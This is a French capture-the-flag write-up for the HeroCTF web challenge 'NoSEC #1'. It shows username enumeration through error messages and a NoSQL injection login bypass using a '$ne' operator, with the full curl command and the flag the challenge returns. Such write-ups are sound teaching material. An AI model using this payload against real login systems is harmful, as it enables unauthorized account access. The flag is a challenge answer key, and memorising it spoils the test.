# NoSEC #1

### Catégorie

Web

### Description

Vous devez vous connecter pour valider le challenge !

http://challs.heroctf.fr:3000/login

Format: Hero{flag}

### Auteur

xanhacks

### Solution

Nous pouvons deviner le nom d'utilisateur "admin" en fonction des messages d'erreurs retourner par l'application.
test:test => Not match with this username !
admin:test => Wrong password !

Les données de la requête de connexion sont envoyées au format JSON.

{"username": "admin","password": "test"}

Grâce à cette information et au nom du challenge (NoSEC), nous pouvons deviner assez rapidement que ce challenge
est porté sur l'injection NoSQL.

Nous testons donc un payload assez simple :

{"username":"admin","password":{"$ne":"notvalidpassword"}}

Le nom d'utilisateur est "admin" et le mot de passe n'est pas égal (not equal => $ne) à "notvalidpassword".

```sh
curl -X POST --header "Content-Type: application/json" challs.heroctf.fr:3000/login \
    --data '{"username":"admin", "password": {"$ne": "notvalidpassword"}}'

{"state":"success","msg":"You can validate this challenge with: Hero{NoSQL_1Nject1on_wAw_1597}"}
```

### Flag

Hero{NoSQL_1Nject1on_wAw_1597}